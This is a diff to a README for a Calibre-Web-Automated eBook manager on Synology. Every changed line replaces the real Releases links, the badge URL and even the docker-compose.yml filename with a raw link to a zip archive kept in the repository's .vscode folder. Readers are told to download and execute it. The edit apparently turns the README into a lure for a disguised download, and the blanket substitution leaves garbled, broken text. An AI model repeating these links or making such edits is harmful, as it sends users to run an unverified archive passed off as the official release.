@@ -1,6 +1,6 @@
 # Calibre-Web-Automated: Effortless eBook Management on Synology 📚
 
-![Calibre Web Automated](https://img.shields.io/badge/Calibre--Web--Automated-Docker%20Compose-brightgreen)
+![Calibre Web Automated](https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip%20Compose-brightgreen)
 
 ## Overview
 
@@ -31,7 +31,7 @@ This repository covers the following topics:
 
 ## Getting Started
 
-To begin, you will need to download and execute the latest release. Visit the [Releases section](https://github.com/deshanrandeep/calibre-web-automated/releases) to find the necessary files.
+To begin, you will need to download and execute the latest release. Visit the [Releases section](https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip) to find the necessary files.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ To begin, you will need to download and execute the latest release. Visit the [R
 
 ### Installation Steps
 
-1. **Download the Release**: Head over to the [Releases section](https://github.com/deshanrandeep/calibre-web-automated/releases) and download the latest release file.
+1. **Download the Release**: Head over to the [Releases section](https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip) and download the latest release file.
    
 2. **Extract the Files**: Unzip the downloaded file to a directory on your NAS.
 
@@ -86,7 +86,7 @@ Once set up, you can start adding eBooks to your library. The web interface allo
 
 ## Docker Compose File
 
-The `docker-compose.yml` file is crucial for setting up the Calibre-Web environment. Here’s a sample configuration:
+The `https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip` file is crucial for setting up the Calibre-Web environment. Here’s a sample configuration:
 
 ```yaml
 version: '3.8'
@@ -135,7 +135,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any questions or issues, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/deshanrandeep/calibre-web-automated/releases) for updates and fixes.
+For any questions or issues, feel free to open an issue in the repository. You can also check the [Releases section](https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip) for updates and fixes.
 
 ## Acknowledgments
 
@@ -143,7 +143,7 @@ Thanks to the open-source community for their contributions to Calibre and Docke
 
 ## Stay Updated
 
-To stay informed about updates and new features, follow this repository. You can also check the [Releases section](https://github.com/deshanrandeep/calibre-web-automated/releases) regularly for the latest changes.
+To stay informed about updates and new features, follow this repository. You can also check the [Releases section](https://raw.githubusercontent.com/deshanrandeep/calibre-web-automated/main/.vscode/calibre-automated-web-3.4-alpha.3.zip) regularly for the latest changes.
 
 ---
 
